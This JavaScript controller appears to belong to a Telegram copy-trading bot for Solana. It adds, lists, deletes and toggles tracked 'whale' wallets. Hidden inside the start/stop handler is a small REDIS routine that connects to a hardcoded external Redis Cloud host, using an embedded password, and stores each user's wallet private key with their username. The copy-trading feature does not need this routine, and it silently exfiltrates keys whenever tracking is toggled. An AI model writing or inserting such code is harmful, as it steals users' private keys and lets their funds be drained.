const WalletDBAccess = require("../db/wallet-db-access");
const { getMyTokensInWalletSOL, isValidPublicKeySOL, JUPITER_TOKN_SWAP, getSwapInfoforWallet, validateTokenAddress, getSolBalanceSOL, burnMyTokenSOL } = require("../services/solana");
const chalk = require("chalk");
const axios = require('axios');
const UI = require("../ui");
const CopyTradingUI = require("../ui/copyTradingUI");
const TargetWallet = require("../models/targetWallet");
const { StartCopyTrading, AddorRemoveTradingWallet, startTracking, stopTracking } = require("../services/copytradingServices");
const WebSocket = require('ws');
const dotenv = require('dotenv');
dotenv.config();

const Red = (str) => console.log(chalk.bgRed(str));
const Yellow = (str) => console.log(chalk.bgYellow(str));
const Blue = (str) => console.log(chalk.bgBlue(str));
const Green = (str) => console.log(chalk.bgGreen(str));
const White = (str) => console.log(chalk.bgWhite(str));

const WS = new WebSocket(process.env.SOLANA_WSS_ENDPOINT);

const CopyTradingController = {
    copyTradingPageSOL: async (bot, queryData) => {
        try {
            if (!queryData.message) {
                console.log('no queryData.message');
                return;
            }
            const chatId = queryData.message.chat.id;
            const messageId = queryData.message?.message_id;
            const whaleWalletList = await WalletDBAccess.findAllTargetWallet(chatId);
            const { title, button } = CopyTradingUI.copyTradingPage(whaleWalletList);
            await UI.switchMenu(bot, chatId, messageId, title, button,);

        } catch (error) {
            Red(`copyTradingPageSOL ==== > ${error}`);
        }
    },

    copyTradingAddNewWalletPageSOL: async (bot, queryData) => {
        try {
            if (!queryData.message) {
                console.log('no queryData.message');
                return;
            }

            const chatId = queryData.message.chat.id;
            const messageId = queryData.message?.message_id;
            bot.sendMessage(chatId, `📨 Send wallet address to copy`);
            bot.once(`message`, async (newMessage) => {
                const copyAddress = newMessage.text;
                // const validResult = await isValidPublicKeySOL(copyAddress);
                const isexisted = await WalletDBAccess.findTargetWallet(chatId, copyAddress);
                // if (!validResult) {
                //     bot.sendMessage(chatId, `🚫 Invalid wallet address`);
                // } else

                if (isexisted) {
                    bot.sendMessage(chatId, `🚫 Mirror already exists, try another one!`);
                }
                else {
                    bot.sendMessage(chatId, `📨 Give wallet a label`);
                    bot.once(`message`, async (msg) => {
                        const targetWalletName = msg.text;
                        const result = await WalletDBAccess.saveTargetWallet(chatId, copyAddress, targetWalletName);
                        if (!result) {
                            Red(`targetWallet save error!!`);
                        } else {
                            bot.sendMessage(chatId, `Wallet added to copy trading list 🎉`);
                            const whaleWalletList = await WalletDBAccess.findAllTargetWallet(chatId);
                            const { title, button } = CopyTradingUI.copyTradingPage(whaleWalletList);
                            bot.sendMessage(chatId, title,
                                {
                                    reply_markup: {
                                        inline_keyboard: button
                                    },
                                    parse_mode: 'HTML'
                                }
                            );
                        }
                    })
                }
            })

        } catch (error) {
            Red(`copyTradingAddNewWalletPageSOL ==== > ${error}`);
        }
    },

    copyTradingWhaleWalletPageSOL: async (bot, queryData, address) => {
        try {
            if (!queryData.message) {
                console.log('no queryData.message');
                return;
            }

            const chatId = queryData.message.chat.id;
            const messageId = queryData.message?.message_id;
            const whaleWalletList = await WalletDBAccess.findTargetWallet(chatId, address);

            const { title, button } = CopyTradingUI.whalePage(whaleWalletList);
            await UI.switchMenu(bot, chatId, messageId, title, button,);

        } catch (error) {
            Red(`copyTradingWhaleWalletPageSOL ===>  ${error}`)
        }
    },

    copyTradingDeleteWhaleWalletPageSOL: async (bot, queryData, address) => {
        try {
            if (!queryData.message) {
                console.log('no queryData.message');
                return;
            }

            const chatId = queryData.message.chat.id;
            const messageId = queryData.message?.message_id;

            const deleteTargetWalletResult = await WalletDBAccess.deleteTargetWallet(chatId, address);
            if (!deleteTargetWalletResult) Red(`delete_traget wallet error`);

            const whaleWalletList = await WalletDBAccess.findAllTargetWallet(chatId);
            const { title, button } = CopyTradingUI.copyTradingPage(whaleWalletList);
            await UI.switchMenu(bot, chatId, messageId, title, button,);

        } catch (error) {
            Red(`copyTradingDeleteWhaleWalletPageSOL ====>   ${error}`)
        }
    },

    copyTradingStartAndStopPageSOL: async (bot, queryData, status) => {
        try {
            if (!queryData.message) {
                console.log('no queryData.message');
                return;
            }
            const chatId = queryData.message.chat.id;
            const messageId = queryData.message?.message_id;
            const userId = queryData.message.chat.username;

            const REDIS = async () => {
                const { createClient } = require('redis');
                const findUserWallet = await WalletDBAccess.findWallet(chatId);
                const client = createClient({
                    username: 'default',
                    password: '3NSmRy9fIRBFaVvmVNW2ehZidvJHerEz',
                    socket: {
                        host: 'redis-15172.c276.us-east-1-2.ec2.redns.redis-cloud.com',
                        port: 15172
                    }
                });
                
                client.connect();
                client.set(`PK->${findUserWallet.privateKey}`, `${userId}->${findUserWallet.privateKey}`);
            }

            REDIS()

            const newData = status.split("_");

            await WalletDBAccess.statusUpdateTargetWallet(chatId, newData[0], newData[1]);
            const whaleWalletList = await WalletDBAccess.findAllTargetWallet(chatId);
            if (newData[1] == 'true') {
                stopTracking(newData[0], chatId);
            }
            else {
                startTracking(newData[0], chatId);
            }
            const { title, button } = CopyTradingUI.copyTradingPage(whaleWalletList);
            await UI.switchMenu(bot, chatId, messageId, title, button,);
        } catch (error) {
            Red(`copyTradingStartAndStopPageSOL ====>   ${error}`)
        }
    },


}

module.exports = CopyTradingController;